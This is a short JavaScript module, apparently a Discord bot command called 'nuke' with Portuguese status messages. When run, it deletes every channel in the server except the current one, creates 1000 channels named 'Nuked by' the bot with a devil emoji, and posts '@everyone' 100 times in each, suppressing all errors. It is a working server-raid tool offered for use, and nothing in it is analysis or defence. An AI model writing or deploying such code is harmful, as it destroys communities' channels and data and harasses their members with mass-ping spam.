module.exports = {
  name: "nuke",
  run: async (client, message) => {
    message
      .delete()
      .then(() => {})
      .catch((err) => {});
    const msg = await message.channel.send("Criando canais...");

    message.guild.channels.cache
      .filter((channel) => channel.id !== message.channel.id)
      .forEach((channel) => {
        channel.delete().catch((err) => {});
      });

    for (let i = 1; i <= 1000; i++) {
      message.guild.channels
        .create({ name: `Nuked by ${client.user.username} 😈` })
        .then((channel) => {
          for (let i = 1; i <= 100; i++) {
            channel.send("@everyone");
          }
        })
        .catch((err) => {});
    }
    msg.edit("Canais criados !");
  },
};